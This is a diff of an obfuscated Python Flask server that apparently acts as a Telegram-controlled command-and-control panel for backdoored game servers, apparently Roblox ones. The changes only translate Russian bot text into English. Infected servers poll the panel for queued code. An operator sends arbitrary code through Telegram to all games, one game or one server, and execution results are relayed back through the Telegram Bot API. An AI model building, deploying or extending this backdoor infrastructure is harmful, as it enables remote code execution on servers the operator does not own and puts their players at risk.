@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 from flask import Flask, request, jsonify
 import threading, time, requests, os, io, json
 
@@ -7,7 +6,7 @@ _k2 = int(os.environ.get("pep", "0"))
 _k3 = os.environ.get("beb", "")
 
 if not _k1 or not _k2 or not _k3:
-    raise SystemExit("config missing")
+    raise SystemExit("Config missing")
 
 _a1 = Flask(__name__)
 _a2 = []
@@ -32,16 +31,16 @@ threading.Thread(target=_cleanup, daemon=True).start()
 
 @_a1.route("/health")
 def _h0():
-    return "ok"
+    return "Ok"
 
 @_a1.route("/")
 def _h1():
-    return "alive"
+    return "Alive"
 
 @_a1.route("/poll")
 def _h2():
     if request.args.get("token") != _k3:
-        return jsonify({"error": "no"}), 403
+        return jsonify({"error": "No"}), 403
     _pid = request.args.get("place", "0")
     _jid = request.args.get("job", "")
     _pl = request.args.get("players", "0")
@@ -71,7 +70,7 @@ def _h2():
 @_a1.route("/result", methods=["POST"])
 def _h3():
     if request.headers.get("X-Token") != _k3:
-        return jsonify({"error": "no"}), 403
+        return jsonify({"error": "No"}), 403
     _d = request.json or {}
     with _a4:
         _a3.append({
@@ -90,7 +89,7 @@ def _s1(_t, _kb=None):
         requests.post("https://api.telegram.org/bot" + _k1 + "/sendMessage",
                       data=_data, timeout=10)
     except Exception as _e:
-        print("err:", _e)
+        print("Err:", _e)
 
 def _s2(_n, _c):
     try:
@@ -99,7 +98,7 @@ def _s2(_n, _c):
                       files={"document": (_n, io.BytesIO(_c.encode("utf-8")), "text/plain")},
                       timeout=30)
     except Exception as _e:
-        print("err:", _e)
+        print("Err:", _e)
 
 def _edit(_mid, _t, _kb=None):
     _data = {"chat_id": _k2, "message_id": _mid, "text": _t[:4000]}
@@ -109,38 +108,38 @@ def _edit(_mid, _t, _kb=None):
         requests.post("https://api.telegram.org/bot" + _k1 + "/editMessageText",
                       data=_data, timeout=10)
     except Exception as _e:
-        print("err:", _e)
+        print("Err:", _e)
 
 def _menu_games():
     with _a4:
         if not _a5:
-            return "Активных игр нет.", {"inline_keyboard": [[{"text": "Обновить", "callback_data": "menu:games"}]]}
+            return "No active games.", {"inline_keyboard": [[{"text": "Refresh", "callback_data": "menu:games"}]]}
         _btns = []
-        _btns.append([{"text": "Все игры", "callback_data": "use:all:all"}])
+        _btns.append([{"text": "All Games", "callback_data": "use:all:all"}])
         for _p, _js in _a5.items():
             _total = sum(j["players"] for j in _js.values())
             _btns.append([{
-                "text": f"Игра {_p}   {len(_js)} серверов   {_total} игроков",
+                "text": f"Game {_p}   {len(_js)} servers   {_total} players",
                 "callback_data": f"menu:game:{_p}"
             }])
-        _btns.append([{"text": "Обновить", "callback_data": "menu:games"}])
-        return "Выбери игру:", {"inline_keyboard": _btns}
+        _btns.append([{"text": "Refresh", "callback_data": "menu:games"}])
+        return "Select a game:", {"inline_keyboard": _btns}
 
 def _menu_game(_p):
     with _a4:
         if _p not in _a5:
-            return "Игра офлайн.", {"inline_keyboard": [[{"text": "Назад", "callback_data": "menu:games"}]]}
+            return "Game offline.", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]}
         _js = _a5[_p]
         _total = sum(j["players"] for j in _js.values())
         _btns = []
-        _btns.append([{"text": f"Все серверы ({_total} игроков)", "callback_data": f"use:{_p}:all"}])
+        _btns.append([{"text": f"All Servers ({_total} players)", "callback_data": f"use:{_p}:all"}])
         for _j, _info in _js.items():
             _btns.append([{
-                "text": f"Сервер {_j[:20]}   {_info['players']} игроков",
+                "text": f"Server {_j[:20]}   {_info['players']} players",
                 "callback_data": f"use:{_p}:{_j}"
             }])
-        _btns.append([{"text": "Назад", "callback_data": "menu:games"}])
-        return f"Игра {_p}:", {"inline_keyboard": _btns}
+        _btns.append([{"text": "Back", "callback_data": "menu:games"}])
+        return f"Game {_p}:", {"inline_keyboard": _btns}
 
 def _p1():
     _l = None
@@ -174,17 +173,17 @@ def _p1():
                                 _b1["target"] = "all"
                                 _b1["place"] = None
                                 _b1["job"] = None
-                                _edit(_mid, "Цель: все игры", {"inline_keyboard": [[{"text": "Назад", "callback_data": "menu:games"}]]})
+                                _edit(_mid, "Target: All Games", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]})
                             elif _j == "all":
                                 _b1["target"] = "place"
                                 _b1["place"] = _p
                                 _b1["job"] = None
-                                _edit(_mid, f"Цель: игра {_p}", {"inline_keyboard": [[{"text": "Назад", "callback_data": f"menu:game:{_p}"}]]})
+                                _edit(_mid, f"Target: Game {_p}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
                             else:
                                 _b1["target"] = "job"
                                 _b1["place"] = _p
                                 _b1["job"] = _j
-                                _edit(_mid, f"Цель: сервер {_j[:20]}", {"inline_keyboard": [[{"text": "Назад", "callback_data": f"menu:game:{_p}"}]]})
+                                _edit(_mid, f"Target: Server {_j[:20]}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
                     try:
                         requests.post("https://api.telegram.org/bot" + _k1 + "/answerCallbackQuery",
                                       data={"callback_query_id": _cb["id"]})
@@ -198,10 +197,10 @@ def _p1():
 
                 if _x == "/start":
                     _s1("ServerSide control\n\n"
-                        "/games   активные игры\n"
-                        "/current текущая цель\n"
-                        "/reset   цель = все\n\n"
-                        "Обычный текст — выполнится на текущей цели."); continue
+                        "/games   Active games\n"
+                        "/current Current target\n"
+                        "/reset   Target = all\n\n"
+                        "Plain text executes on the current target."); continue
 
                 if _x == "/games":
                     _t, _kb = _menu_games()
@@ -209,35 +208,35 @@ def _p1():
                     continue
 
                 if _x == "/current":
-                    _s1(f"Цель: {_b1['target']}\nИгра: {_b1['place']}\nСервер: {_b1['job']}")
+                    _s1(f"Target: {_b1['target']}\nGame: {_b1['place']}\nServer: {_b1['job']}")
                     continue
 
                 if _x == "/reset":
                     _b1["target"] = "all"; _b1["place"] = None; _b1["job"] = None
-                    _s1("Цель: все игры"); continue
+                    _s1("Target: All Games"); continue
 
                 if _x.startswith("all "):
                     _code = _x[4:]
                     with _a4:
                         _a2.append({"cmd": _code, "target": "all", "ts": time.time()})
-                    _s1("Отправлено: все игры")
+                    _s1("Sent: All Games")
                     continue
 
                 _t = _b1["target"]
                 if _t == "all":
                     with _a4:
                         _a2.append({"cmd": _x, "target": "all", "ts": time.time()})
-                    _s1("Отправлено: все игры")
+                    _s1("Sent: All Games")
                 elif _t == "place":
                     with _a4:
                         _a2.append({"cmd": _x, "target": "place", "place": _b1["place"], "ts": time.time()})
-                    _s1(f"Отправлено: игра {_b1['place']}")
+                    _s1(f"Sent: Game {_b1['place']}")
                 elif _t == "job":
                     with _a4:
                         _a2.append({"cmd": _x, "target": "job", "job": _b1["job"], "ts": time.time()})
-                    _s1(f"Отправлено: сервер {_b1['job'][:20]}")
+                    _s1(f"Sent: Server {_b1['job'][:20]}")
         except Exception as _e:
-            print("err:", _e)
+            print("Err:", _e)
             time.sleep(3)
 
 def _p2():
@@ -253,10 +252,10 @@ def _p2():
             _o = (_x.get("out") or "").strip()
             _tag = f"[{_x['place']}/{_x['job'][:8]}]"
             if _o.startswith("compile err:") or _o.startswith("runtime err:"):
-                _s1(f"{_tag} Ошибка\n{_o}")
+                _s1(f"{_tag} Error\n{_o}")
             else:
                 if not _o or _o == "nil":
-                    _s1(f"{_tag} Выполнено")
+                    _s1(f"{_tag} Done")
                 else:
                     _s2("result.txt", f"{_tag} $ {_c}\n\n{_o}")
 
@@ -265,5 +264,5 @@ threading.Thread(target=_p2, daemon=True).start()
 
 if __name__ == "__main__":
     _prt = int(os.environ.get("PORT", 8080))
-    print("[+] started", _prt)
+    print("[+] Started", _prt)
     _a1.run(host="0.0.0.0", port=_prt, debug=False)
